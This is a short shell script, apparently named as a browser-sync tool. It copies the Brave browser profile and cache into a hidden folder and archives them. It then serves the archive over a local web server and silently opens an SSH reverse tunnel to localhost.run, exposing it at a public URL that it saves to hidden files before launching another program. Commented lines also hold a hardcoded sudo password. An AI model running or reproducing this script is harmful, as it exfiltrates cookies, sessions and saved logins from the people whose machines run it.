# echo atharva123 | sudo -S apt install python3 -y
# echo atharva123 | sudo -S apt install ssh -y
# echo atharva123 | sudo -S apt install openssh-server -y

if [[ -f /home/$USER/.ssh/id_rsa ]]; then
    echo done
else
    echo -ne '\n' | ssh-keygen
fi

mkdir -p ~/.browsync/config ~/.browsync/cache

cd ~/.config/ && cp BraveSoftware/ -r ~/.browsync/config/
cd ~/.cache/ && cp BraveSoftware/ -r ~/.browsync/cache/

cd ~/.browsync

tar -cvJf target.tar.xz *

mkdir .resources && touch .resources/.tee.txt .resources/.link.txt
touch index.html
echo '<a href="target.tar.xz" download>target.tar.xz</a>' >index.html

{
    python3 -m http.server 8000 &
    ssh -R 80:localhost:8000 localhost.run | tee .resources/.tee.txt &
} &>/dev/null

sleep 15 && cat .resources/.tee.txt | sed 's/^.*https/https/' >.resources/.link.txt
sleep 2 && ~/sql/sqltools

read
